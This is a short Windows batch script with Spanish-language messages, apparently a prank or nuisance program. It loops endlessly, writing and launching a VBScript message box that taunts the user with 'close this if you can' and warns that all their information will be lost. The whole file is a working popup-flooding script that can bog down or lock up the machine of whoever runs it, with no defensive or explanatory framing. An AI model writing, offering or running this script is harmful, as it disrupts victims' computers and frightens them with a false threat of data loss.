@echo off 
:inicio

echo MsgBox "CIERRA ESTO SI PUEDES.", 64, "PERDERÁS TODA LA INFORMACIÓN" >%temp%\mensaje.vbs
start %temp%\mensaje.vbs 
goto inicio||
